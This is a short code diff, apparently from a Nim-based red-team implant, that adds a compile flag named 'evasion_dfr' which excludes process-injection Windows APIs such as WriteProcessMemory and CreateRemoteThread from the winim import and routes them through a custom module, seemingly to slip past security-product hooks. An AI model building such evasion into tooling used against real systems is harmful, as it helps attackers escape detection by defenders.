@@ -5,7 +5,11 @@ import ../utils/strenc
 import std/[json, strutils, strformat, base64]
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, CreateRemoteThread, ResumeThread, QueueUserAPC, CreateProcessWithLogonW
+    import ../utils/winapi
+  else:
+    import winim/lean
 
 type
   SpawnAsArgs = object
